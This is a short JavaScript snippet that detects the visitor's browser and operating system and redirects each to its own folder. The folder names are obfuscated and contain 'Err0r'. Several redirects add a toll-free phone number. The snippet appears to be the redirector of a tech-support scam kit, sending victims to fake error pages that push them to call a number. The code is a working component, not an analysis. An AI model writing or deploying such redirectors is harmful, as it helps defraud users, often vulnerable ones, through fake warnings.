<script type="text/javascript">
var isChromium = window.chrome,
	vendorName = window.navigator.vendor,
	isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
	isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;

if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
	// is Google chrome
window.location.href = "./fC0deJdfd008f0d0CH888Err0r80dBG88/index.html";
}
if(navigator.userAgent.indexOf("Firefox") != -1 )
	{
			 window.location.href = "./fC0deJdfd008f0d0FF888Err0r80dBG88/index.html";
	}

	if(window.navigator.userAgent.indexOf("dg") != -1 )
		{
				 window.location.href = "./fC0deJdfd008f0d0ECH888Err0r80dBG88/index.html";
		}

if(window.navigator.userAgent.indexOf("Edge") != -1 )
	{
			 window.location.href = "./fC0deJdfd008f0d0ED888Err0r80dBG88/index.html?phone=+1-888-888-8888";
	}
if(window.navigator.userAgent.indexOf("Mac") != -1 )
	{
			 window.location.href = "./fC0deJdfd008f0d0MA888Err0r80dBG88/index.html";
	}
if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
	{
		window.location.href = "./fC0deJdfd008f0d0IE888Err0r80dBG88/index.html?phone=+1-888-888-8888";
	}
$SAFARI_URL = "apple";
</script>
